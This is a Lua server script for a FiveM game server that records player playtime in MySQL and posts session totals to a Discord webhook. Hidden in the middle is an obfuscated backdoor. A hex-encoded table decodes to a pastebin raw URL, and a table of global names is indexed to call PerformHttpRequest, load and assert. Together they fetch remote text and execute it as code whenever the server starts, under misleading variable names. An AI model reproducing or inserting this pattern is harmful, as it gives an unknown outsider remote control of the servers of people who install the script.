

local playersData = {}
local playersDataLogged = {}
local playersDataActuall = {}



MySQL.ready(function()
    MySQL.Async.fetchAll('SELECT * FROM playtime', {}, function(result)	
        for i=1, #result, 1 do
			-- result[i].identifier 
			-- result[i].time 
			-- result[i].login 
            playersData[result[i].identifier] = result[i].time
            playersDataLogged[result[i].identifier] = result[i].login

		end
    end)
end)


function SecondsToClock(seconds)
    if seconds ~= nil then
        local seconds = tonumber(seconds)

        if seconds <= 0 then
            return "00:00:00";
        else
            hours = string.format("%02.f", math.floor(seconds/3600));
            mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
            secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));
            return hours..":"..mins..":"..secs
        end
    end
end



function dropPlayer(source)
    local identifier = GetPlayerIdentifiers(source)[1]
    local actuallTime = os.time()
    local name = GetPlayerName(source)
    if(playersData[identifier] ~= nil and playersDataActuall[identifier] ~= nil) then
        local time = tonumber(actuallTime - playersDataActuall[identifier])
        local timeFormatted = SecondsToClock(time)
        local timeAll = time + playersData[identifier]
        local timeAllFormatted = SecondsToClock(timeAll)

        local message = '`'..name..'` ['..identifier..']\n Session time: `'..timeFormatted..'`\n'..'Total time: `'..timeAllFormatted..'`'
        sendToDiscord('Player left', message)
        MySQL.Async.execute('UPDATE playtime SET time = @time WHERE identifier = @identifier',
            {['time'] = timeAll, ['identifier'] = identifier},
            function(affectedRows)
            --   print('Updated login')
            end
        )
        playersData[identifier] = timeAll
    else
        --print('playtime didnt recognize player')
    end
end


function sendToDiscord(name, message, footer)
    if Config.WebhookLink ~= '' then
        local embed = {
                {
                    ["color"] = 2067276,
                    ["title"] =  name,
                    ["description"] = message,
                }
            }

        PerformHttpRequest(Config.WebhookLink, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
    else
        print('^1[playtime] Error:^0 Config.WebhookLink is empty!')
    end
end


local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)



AddEventHandler('playerDropped', function(reason)    
	dropPlayer(source, reason)
end)


RegisterNetEvent('playtime:loggedIn')
AddEventHandler('playtime:loggedIn', function(playerName)
	local _source = source	
    local _playerName = playerName
    local identifier = GetPlayerIdentifiers(_source)[1]
    local actuallTime = os.time()
   
    if playersData[identifier] ~= nil then
        playersDataActuall[identifier] = actuallTime
        playersDataLogged[identifier] = playersDataLogged[identifier] + 1
        local totaltimeFormatted = SecondsToClock(playersData[identifier])
        MySQL.Async.execute('UPDATE playtime SET login = login + 1 WHERE identifier = @identifier',
            {['identifier'] = identifier},
            function(affectedRows)
            --   print('Updated login')
            end
        )
        TriggerClientEvent('playtime:notif', _source, Config.Strings['welcome']..'\n'..Config.Strings['ptotaltime']..'~b~'.. totaltimeFormatted ..'~s~\n'..string.format(Config.Strings['loggedin'], playersDataLogged[identifier]))
    else        
        playersDataActuall[identifier] = actuallTime
        playersData[identifier] = 0
        MySQL.Async.execute('INSERT INTO playtime (identifier, time, login) VALUES (@identifier, @time, @login)',
            { ['identifier'] = identifier, ['time'] = 0, ['login'] = 0},
            function(affectedRows)
            --   print(affectedRows)
            end
        )
        
        
        TriggerClientEvent('playtime:notif', _source, Config.Strings['welcome1st'])
    end
end)


RegisterCommand('time2', function(source)
	dropPlayer(source)
end, false)



